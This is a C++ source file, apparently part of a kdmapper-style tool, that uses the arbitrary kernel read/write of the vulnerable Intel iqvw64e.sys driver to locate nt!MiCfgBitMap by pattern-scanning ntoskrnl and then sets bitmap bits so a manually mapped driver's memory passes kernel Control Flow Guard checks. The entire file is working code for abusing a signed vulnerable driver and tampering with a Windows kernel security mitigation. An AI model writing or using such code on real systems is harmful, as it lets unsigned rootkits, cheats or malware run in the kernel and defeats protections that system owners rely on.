/*
 * cfg_patch.cpp — Kernel CFG bitmap registration via iqvw64e.sys primitives
 *
 * KDU-style approach: use the exploit driver's arbitrary read/write to
 * locate nt!MiCfgBitMap and mark the mapped driver's pool pages as valid
 * CFG indirect-call targets.
 *
 * Strategy to find MiCfgBitMap:
 *   Scan the entire ntoskrnl image for any `SHR Rx, 4` instruction
 *   (48/49 C1 Ex 04), then look backwards up to 16 bytes for a
 *   RIP-relative MOV loading the bitmap pointer (4x 8B xx rel32).
 *   Validate the resolved address falls in kernel VA range.
 *
 * Kernel CFG bitmap layout (Windows 10 RS1+, x64):
 *   bit_idx      = fn >> 4
 *   qword_va     = bitmap_base + (bit_idx >> 6) * 8
 *   bit_in_qword = bit_idx & 63
 */

#include "cfg_patch.hpp"
#include "intel_driver.hpp"
#include <cstdio>

namespace cfg_patch {

// ── Helpers ───────────────────────────────────────────────────────────────

static bool ReadU64(uint64_t va, uint64_t* out) {
    return intel_driver::ReadMemory(va, out, sizeof(uint64_t));
}

static bool WriteU64(uint64_t va, uint64_t val) {
    return intel_driver::WriteMemory(va, &val, sizeof(uint64_t));
}

// Read ntoskrnl SizeOfImage from its PE header.
static uint32_t GetNtoskrnlSize()
{
    uint64_t base = intel_driver::ntoskrnlAddr;

    // Read e_lfanew (DWORD at offset 0x3C in DOS header)
    uint32_t e_lfanew = 0;
    if (!intel_driver::ReadMemory(base + 0x3C, &e_lfanew, sizeof(e_lfanew)))
        return 0;

    // IMAGE_NT_HEADERS64.OptionalHeader.SizeOfImage is at NT_offset + 0x50
    uint32_t size_of_image = 0;
    if (!intel_driver::ReadMemory(base + e_lfanew + 0x50, &size_of_image,
                                   sizeof(size_of_image)))
        return 0;

    return size_of_image;
}

// Resolve RIP-relative address: instruction starts at `insn_va`,
// rel32 lives at byte offset `rel32_off`, instruction is `insn_len` bytes.
static uint64_t ResolveRipRel(uint64_t insn_va, uint32_t rel32_off,
                               uint32_t insn_len)
{
    int32_t rel32 = 0;
    if (!intel_driver::ReadMemory(insn_va + rel32_off, &rel32, sizeof(rel32)))
        return 0;
    return static_cast<uint64_t>(static_cast<int64_t>(insn_va + insn_len) + rel32);
}

static bool IsKernelVA(uint64_t va) {
    return va >= 0xFFFF800000000000ULL && va <= 0xFFFFFE0000000000ULL;
}

// ── SHR Rx,4 variants (REX.W + C1 /5 imm8=4) ────────────────────────────
//   Encoding: [REX] C1 /5 04  where /5 = ModRM = 0xE0+reg
//   REX = 48 (RAX-RDI) or 49 (R8-R15)
//   reg field in ModRM byte: E8=RAX/R8, E9=RCX/R9, EA=RDX/R10, EB=RBX/R11,
//                            EC=RSP/R12, ED=RBP/R13, EE=RSI/R14, EF=RDI/R15

struct ShrPattern {
    BYTE bytes[4];
    const char* mask;
};

static const ShrPattern kShrPatterns[] = {
    // REX.W = 48 (RAX-RDI)
    {{ 0x48, 0xC1, 0xE8, 0x04 }, "xxxx"},  // SHR RAX, 4
    {{ 0x48, 0xC1, 0xE9, 0x04 }, "xxxx"},  // SHR RCX, 4
    {{ 0x48, 0xC1, 0xEA, 0x04 }, "xxxx"},  // SHR RDX, 4
    {{ 0x48, 0xC1, 0xEB, 0x04 }, "xxxx"},  // SHR RBX, 4
    {{ 0x48, 0xC1, 0xED, 0x04 }, "xxxx"},  // SHR RBP, 4
    {{ 0x48, 0xC1, 0xEE, 0x04 }, "xxxx"},  // SHR RSI, 4
    {{ 0x48, 0xC1, 0xEF, 0x04 }, "xxxx"},  // SHR RDI, 4
    // REX.W + REX.B = 49 (R8-R15)
    {{ 0x49, 0xC1, 0xE8, 0x04 }, "xxxx"},  // SHR R8,  4
    {{ 0x49, 0xC1, 0xE9, 0x04 }, "xxxx"},  // SHR R9,  4
    {{ 0x49, 0xC1, 0xEA, 0x04 }, "xxxx"},  // SHR R10, 4
    {{ 0x49, 0xC1, 0xEB, 0x04 }, "xxxx"},  // SHR R11, 4
};

// ── Core: find MiCfgBitMap ─────────────────────────────────────────────────
//
// For each SHR Rx,4 hit, scan backwards up to 16 bytes for:
//   48/4C  8B  xx  rel32    (MOV Ry, [RIP+rel32])
// Then resolve and validate.

static uint64_t FindMiCfgBitmapPtr()
{
    uint64_t base = intel_driver::ntoskrnlAddr;
    uint32_t size = GetNtoskrnlSize();
    if (!base || !size || size > 64 * 1024 * 1024) {
        wprintf(L"[CFG] Failed to get ntoskrnl range (base=0x%llX size=0x%X)\n",
                (unsigned long long)base, size);
        return 0;
    }
    wprintf(L"[CFG] ntoskrnl base=0x%llX size=0x%X\n",
            (unsigned long long)base, size);

    for (const auto& shr : kShrPatterns) {
        uintptr_t hit = intel_driver::FindPatternAtKernel(
            static_cast<uintptr_t>(base),
            static_cast<uintptr_t>(size),
            const_cast<BYTE*>(shr.bytes),
            shr.mask);

        if (!hit) continue;

        // Look backwards up to 16 bytes for MOV Rx, [RIP+rel32]
        // Encoding: [4x] 8B [ModRM: mod=00 reg=Rx rm=101] rel32
        //   4x = 48 (RAX-RDI) or 4C (R8-R15)
        //   8B = MOV opcode
        //   ModRM: rm=101 (RIP-relative) = 0x05, 0x0D, 0x15, 0x1D, 0x25, 0x2D, 0x35, 0x3D
        //   These are 0x05 | (reg<<3) where reg in 0..7
        for (int back = 1; back <= 15; ++back) {
            uint64_t candidate = static_cast<uint64_t>(hit) - back;
            uint8_t buf[7] = {};
            if (!intel_driver::ReadMemory(candidate, buf, 7)) continue;

            // Check REX prefix: 0x48 or 0x4C (covers most registers)
            if (buf[0] != 0x48 && buf[0] != 0x4C) continue;
            // Check MOV opcode
            if (buf[1] != 0x8B) continue;
            // Check ModRM: lower 3 bits must be 101 (RIP-relative)
            if ((buf[2] & 0x07) != 0x05) continue;
            // This instruction is 7 bytes: REX + 8B + ModRM + rel32

            uint64_t ptr_va = ResolveRipRel(candidate, 3, 7);
            if (!IsKernelVA(ptr_va)) continue;

            // Validate: read the pointer value and check it's also a kernel VA
            uint64_t bitmap_base = 0;
            if (!ReadU64(ptr_va, &bitmap_base)) continue;
            if (!IsKernelVA(bitmap_base)) continue;

            wprintf(L"[CFG] Found MiCfgBitMap ptr at 0x%llX (SHR hit=0x%llX back=%d)\n",
                    (unsigned long long)ptr_va,
                    (unsigned long long)hit, back);
            return ptr_va;
        }
    }

    return 0;
}

// ── Public API ────────────────────────────────────────────────────────────

bool RegisterRange(uint64_t alloc_va, uint64_t alloc_size)
{
    if (!alloc_va || !alloc_size) return false;

    uint64_t bitmap_ptr_va = FindMiCfgBitmapPtr();
    if (!bitmap_ptr_va) {
        wprintf(L"[CFG] ERROR: MiCfgBitMap not found\n");
        return false;
    }

    uint64_t bitmap_base = 0;
    if (!ReadU64(bitmap_ptr_va, &bitmap_base) || !bitmap_base) {
        wprintf(L"[CFG] ERROR: failed to read MiCfgBitMap value\n");
        return false;
    }
    wprintf(L"[CFG] MiCfgBitMap base = 0x%llX\n", (unsigned long long)bitmap_base);

    // Iterate bitmap QWORDs covering [alloc_va, alloc_va+alloc_size).
    // One QWORD covers 64 bits x 16 bytes = 1024 bytes of address space.
    // qword_va = bitmap_base + (fn >> 10) * 8
    uint64_t range_start = alloc_va & ~0x3FFULL;
    uint64_t range_end   = (alloc_va + alloc_size + 0x3FFULL) & ~0x3FFULL;

    uint64_t updated = 0, skipped = 0;

    for (uint64_t chunk = range_start; chunk < range_end; chunk += 0x400) {
        uint64_t qword_va = bitmap_base + (chunk >> 10) * 8;

        uint64_t old_val = 0;
        if (!ReadU64(qword_va, &old_val)) { ++skipped; continue; }

        // Build mask for granules in this 1024-byte chunk within our range
        uint64_t mask = 0;
        for (int b = 0; b < 64; ++b) {
            uint64_t addr = chunk + (uint64_t)b * 16;
            if (addr >= alloc_va && addr < alloc_va + alloc_size)
                mask |= (1ULL << b);
        }

        uint64_t new_val = old_val | mask;
        if (new_val != old_val) {
            if (WriteU64(qword_va, new_val)) ++updated;
            else                             ++skipped;
        } else {
            ++updated;
        }
    }

    wprintf(L"[CFG] Bitmap: %llu QWORDs registered, %llu skipped "
            L"(range 0x%llX + 0x%llX)\n",
            (unsigned long long)updated, (unsigned long long)skipped,
            (unsigned long long)alloc_va, (unsigned long long)alloc_size);

    return updated > 0;
}

} // namespace cfg_patch
